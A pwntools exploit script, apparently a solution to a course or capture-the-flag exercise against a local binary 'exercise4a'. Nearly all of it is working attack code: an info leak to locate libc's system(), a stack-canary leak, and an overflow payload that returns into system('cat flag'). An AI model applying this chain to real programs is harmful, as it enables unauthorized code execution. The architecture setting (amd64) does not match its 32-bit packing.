#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()
    #input()
    r.sendline(b"cat flag") # name
    # leak libc
    r.sendline(b"A"*7) # get libc_2.31.so:printf+9 leak
    r.recvuntil(b"Well of course ")
    libc_leak = r.recvuntil(b" is not the password")[:-len(" is not the password")]
    printf_plus = u32(libc_leak[8:12])
    printf_add = printf_plus - 9
    system_add = printf_add - 0xe9c0 # use libc database
    print(f"System add {hex(system_add)}")
    # leak canary
    print(cyclic_find(0x61616166)) # 20
    r.sendline(b"A"*19)
    r.recvuntil(b"Well of course ")
    canary_leak = r.recvuntil(b" is not the password")[:-len(" is not the password")]
    canary = u32(canary_leak[20:24])
    print(f"Canary {hex(canary)}")
    # Do the system call
    print(cyclic_find(0x61616166)) # 20
    addr_B_buf = 0x804C060 # use the name instead of something else
    cat_flag = b"cat flag"
    r.sendline(b"A"*20 + p32(canary) + b"B"*20 + p32(system_add) + p32(addr_B_buf)*2 + cat_flag + b"\x00"*4)
    #r.interactive()
    r.recvuntil(b"flag is not the password") # get rid of garbage
    print(r.recvall(timeout=1).decode())

for i in range(5):
    try:
        exploit()
    except:
        pass